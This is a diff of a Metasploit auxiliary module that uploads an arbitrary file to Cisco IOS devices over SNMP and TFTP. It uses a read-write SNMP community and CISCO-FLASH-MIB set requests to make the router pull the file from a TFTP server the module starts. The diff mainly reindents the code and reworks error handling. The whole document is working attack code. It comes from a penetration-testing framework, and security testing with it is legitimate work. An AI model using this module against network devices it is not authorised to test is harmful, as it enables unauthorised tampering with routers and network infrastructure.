@@ -1,8 +1,4 @@
 ##
-# $Id$
-##
-
-##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # web site for more information on licensing and terms of use.
@@ -14,128 +10,129 @@ require 'msf/core'
 
 class Metasploit3 < Msf::Auxiliary
 
-	include Msf::Exploit::Remote::SNMPClient
-	include Msf::Auxiliary::Cisco
-	include Msf::Auxiliary::Scanner
+  include Msf::Exploit::Remote::SNMPClient
+  include Msf::Auxiliary::Cisco
+  include Msf::Auxiliary::Scanner
 
-	def initialize
-		super(
-			'Name'        => 'Cisco IOS SNMP File Upload (TFTP)',
-			'Version'        => '$Revision$',
-			'Description' => %q{
-					This module will copy file to a Cisco IOS device using SNMP and TFTP.
-				A read-write SNMP community is required. The SNMP community scanner module can
-				assist in identifying a read-write community. The target must
-				be able to connect back to the Metasploit system and the use of
-				NAT will cause the TFTP transfer to fail.
-				},
-			'Author'      =>
-				[
-					'pello <fropert[at]packetfault.org>'
-				],
-			'License'     => MSF_LICENSE
-		)
-		register_options([
-			OptPath.new('SOURCE', [true, "The filename to upload" ]),
-			OptAddress.new('LHOST', [ false, "The IP address of the system running this module" ])
-		], self.class)
-	end
+  def initialize
+    super(
+      'Name'        => 'Cisco IOS SNMP File Upload (TFTP)',
+      'Description' => %q{
+          This module will copy file to a Cisco IOS device using SNMP and TFTP.
+        A read-write SNMP community is required. The SNMP community scanner module can
+        assist in identifying a read-write community. The target must
+        be able to connect back to the Metasploit system and the use of
+        NAT will cause the TFTP transfer to fail.
+        },
+      'Author'      =>
+        [
+          'pello <fropert[at]packetfault.org>'
+        ],
+      'License'     => MSF_LICENSE
+    )
+    register_options([
+      OptPath.new('SOURCE', [true, "The filename to upload" ]),
+      OptAddress.new('LHOST', [ false, "The IP address of the system running this module" ])
+    ], self.class)
+  end
 
-	#
-	# Start the TFTP Server
-	#
-	def setup
+  #
+  # Start the TFTP Server
+  #
+  def setup
 
-		@path     = datastore['SOURCE']
-		@filename = @path.split(/[\/\\]/)[-1] #/
+    @path     = datastore['SOURCE']
+    @filename = @path.split(/[\/\\]/)[-1] #/
 
-		# Setup is called only once
-		print_status("Starting TFTP server...")
-		@tftp = Rex::Proto::TFTP::Server.new(69, '0.0.0.0', { 'Msf' => framework, 'MsfExploit' => self })
+    # Setup is called only once
+    print_status("Starting TFTP server...")
+    @tftp = Rex::Proto::TFTP::Server.new(69, '0.0.0.0', { 'Msf' => framework, 'MsfExploit' => self })
 
-		# Register our file name and data
-		::File.open(@path, "rb") do |fd|
-			buff = fd.read(fd.stat.size)
-			@tftp.register_file(@filename, buff)
-		end
+    # Register our file name and data
+    ::File.open(@path, "rb") do |fd|
+      buff = fd.read(fd.stat.size)
+      @tftp.register_file(@filename, buff)
+    end
 
-		@tftp.start
-		add_socket(@tftp.sock)
+    @tftp.start
+    add_socket(@tftp.sock)
 
-		@main_thread = ::Thread.current
+    @main_thread = ::Thread.current
 
-	end
+  end
 
-	#
-	# Kill the TFTP server
-	#
-	def cleanup
-		# Cleanup is called once for every single thread
-		if ::Thread.current == @main_thread
-			# Wait 5 seconds for background transfers to complete
-			print_status("Providing some time for transfers to complete...")
-			::IO.select(nil, nil, nil, 5.0)
+  #
+  # Kill the TFTP server
+  #
+  def cleanup
+    # Cleanup is called once for every single thread
+    if ::Thread.current == @main_thread
+      # Wait 5 seconds for background transfers to complete
+      print_status("Providing some time for transfers to complete...")
+      ::IO.select(nil, nil, nil, 5.0)
 
-			print_status("Shutting down the TFTP service...")
-			if @tftp
-				@tftp.close rescue nil
-				@tftp = nil
-			end
-		end
-	end
+      print_status("Shutting down the TFTP service...")
+      if @tftp
+        @tftp.close rescue nil
+        @tftp = nil
+      end
+    end
+  end
 
-	def run_host(ip)
+  def run_host(ip)
 
-		begin
-			lhost = datastore['LHOST'] || Rex::Socket.source_address(ip)
+    begin
+      lhost = datastore['LHOST'] || Rex::Socket.source_address(ip)
 
-			ciscoFlashCopyCommand = "1.3.6.1.4.1.9.9.10.1.2.1.1.2."
-			ciscoFlashCopyProtocol = "1.3.6.1.4.1.9.9.10.1.2.1.1.3."
-			ciscoFlashCopyServerAddress  = "1.3.6.1.4.1.9.9.10.1.2.1.1.4."
-			ciscoFlashCopySourceName = "1.3.6.1.4.1.9.9.10.1.2.1.1.5."
-			ciscoFlashCopyDestinationName = "1.3.6.1.4.1.9.9.10.1.2.1.1.6."
-			ciscoFlashCopyEntryStatus = "1.3.6.1.4.1.9.9.10.1.2.1.1.11."
+      ciscoFlashCopyCommand = "1.3.6.1.4.1.9.9.10.1.2.1.1.2."
+      ciscoFlashCopyProtocol = "1.3.6.1.4.1.9.9.10.1.2.1.1.3."
+      ciscoFlashCopyServerAddress  = "1.3.6.1.4.1.9.9.10.1.2.1.1.4."
+      ciscoFlashCopySourceName = "1.3.6.1.4.1.9.9.10.1.2.1.1.5."
+      ciscoFlashCopyDestinationName = "1.3.6.1.4.1.9.9.10.1.2.1.1.6."
+      ciscoFlashCopyEntryStatus = "1.3.6.1.4.1.9.9.10.1.2.1.1.11."
 
-			session = rand(255) + 1
+      session = rand(255) + 1
 
-			snmp = connect_snmp
+      snmp = connect_snmp
 
-			varbind = SNMP::VarBind.new("#{ciscoFlashCopyEntryStatus}#{session}" , SNMP::Integer.new(6))
-			value = snmp.set(varbind)
+      varbind = SNMP::VarBind.new("#{ciscoFlashCopyEntryStatus}#{session}" , SNMP::Integer.new(6))
+      value = snmp.set(varbind)
 
-			varbind = SNMP::VarBind.new("#{ciscoFlashCopyEntryStatus}#{session}" , SNMP::Integer.new(5))
-			value = snmp.set(varbind)
+      varbind = SNMP::VarBind.new("#{ciscoFlashCopyEntryStatus}#{session}" , SNMP::Integer.new(5))
+      value = snmp.set(varbind)
 
-			varbind = SNMP::VarBind.new("#{ciscoFlashCopyCommand}#{session}" , SNMP::Integer.new(2))
-			value = snmp.set(varbind)
+      varbind = SNMP::VarBind.new("#{ciscoFlashCopyCommand}#{session}" , SNMP::Integer.new(2))
+      value = snmp.set(varbind)
 
-			# If the above line didn't throw an error, the host is alive and the community is valid
-			print_status("Copying file #{@filename} to #{ip}...")
+      # If the above line didn't throw an error, the host is alive and the community is valid
+      print_status("Copying file #{@filename} to #{ip}...")
 
-			varbind = SNMP::VarBind.new("#{ciscoFlashCopyProtocol}#{session}" , SNMP::Integer.new(1))
-			value = snmp.set(varbind)
+      varbind = SNMP::VarBind.new("#{ciscoFlashCopyProtocol}#{session}" , SNMP::Integer.new(1))
+      value = snmp.set(varbind)
 
-			varbind = SNMP::VarBind.new("#{ciscoFlashCopyServerAddress}#{session}", SNMP::IpAddress.new(lhost))
-			value = snmp.set(varbind)
+      varbind = SNMP::VarBind.new("#{ciscoFlashCopyServerAddress}#{session}", SNMP::IpAddress.new(lhost))
+      value = snmp.set(varbind)
 
-			varbind = SNMP::VarBind.new("#{ciscoFlashCopySourceName}#{session}", SNMP::OctetString.new(@filename))
-			value = snmp.set(varbind)
+      varbind = SNMP::VarBind.new("#{ciscoFlashCopySourceName}#{session}", SNMP::OctetString.new(@filename))
+      value = snmp.set(varbind)
 
-			varbind = SNMP::VarBind.new("#{ciscoFlashCopyDestinationName}#{session}", SNMP::OctetString.new(@filename))
-			value = snmp.set(varbind)
+      varbind = SNMP::VarBind.new("#{ciscoFlashCopyDestinationName}#{session}", SNMP::OctetString.new(@filename))
+      value = snmp.set(varbind)
 
-			varbind = SNMP::VarBind.new("#{ciscoFlashCopyEntryStatus}#{session}" , SNMP::Integer.new(1))
-			value = snmp.set(varbind)
+      varbind = SNMP::VarBind.new("#{ciscoFlashCopyEntryStatus}#{session}" , SNMP::Integer.new(1))
+      value = snmp.set(varbind)
 
-			disconnect_snmp
 
-		# No need to make noise about timeouts
-		rescue ::SNMP::RequestTimeout, ::Rex::ConnectionRefused
-		rescue ::Interrupt
-			raise $!
-		rescue ::Exception => e
-			print_error("#{ip} Error: #{e.class} #{e} #{e.backtrace}")
-		end
-	end
+
+    # No need to make noise about timeouts
+    rescue ::Rex::ConnectionError, ::SNMP::RequestTimeout, ::SNMP::UnsupportedVersion
+    rescue ::Interrupt
+      raise $!
+    rescue ::Exception => e
+      print_error("#{ip} Error: #{e.class} #{e} #{e.backtrace}")
+    ensure
+      disconnect_snmp
+    end
+  end
 
 end
